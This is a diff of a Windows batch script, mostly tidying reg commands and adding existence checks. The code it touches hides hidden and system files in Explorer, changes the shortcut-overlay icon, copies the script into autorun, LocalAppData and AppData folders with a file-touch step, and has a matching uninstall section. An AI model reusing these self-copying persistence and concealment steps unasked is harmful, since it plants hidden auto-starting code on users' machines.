@@ -84,9 +84,9 @@ if exist "extensions" for %%i in (%extensions%) do for /f "tokens=1,* delims==" 
 
 
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden          /t REG_DWORD /d 2 /f >nul
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\imageres.dll,10" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v Hidden          /t REG_DWORD /d 2 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v ShowSuperHidden /t REG_DWORD /d 0 /f >nul
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29              /t REG_SZ    /d "%windir%\System32\imageres.dll,10" /f >nul
 rem reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\shell32.dll,-50" /f >nul
 
 
@@ -94,13 +94,9 @@ rem reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons
 
 
 for %%i in (path_autoRun1 path_autoRun2) do if not exist "!%%i!\%~nx0" (
-  call copy /y "%~f0" "!%%i!\"
+  if not exist "!%%i!\%~nx0" call copy /y "%~f0" "!%%i!\"
   call %module_fileTouch% "!%%i!\%~nx0" >nul
 )
-
-
-
-
 
 for %%i in (localAppData appData) do (
   if not exist "!%%i!\%~nx0" call copy /y "%~f0" "!%%i!\"
@@ -197,15 +193,14 @@ if exist "extensions" for %%i in (%extensions%) do for /f "tokens=1,* delims==" 
 
 reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f >nul
 
-if exist "%path_autoRun1%\%~nx0" del /q "%path_autoRun1%\%~nx0"
-if exist "%path_autoRun2%\%~nx0" del /q "%path_autoRun2%\%~nx0"
 
 
 
 
+for %%i in (path_autoRun1 path_autoRun2) do if exist "!%%i!\%~nx0" call del /q "!%%i!\%~nx0"
 
 for %%i in (localAppData appData) do (
-  call del /q "!%%i!\%~nx0"
+  if exist "!%%i!\%~nx0" call del /q "!%%i!\%~nx0"
   %autoRun% delete %%i
 )
 
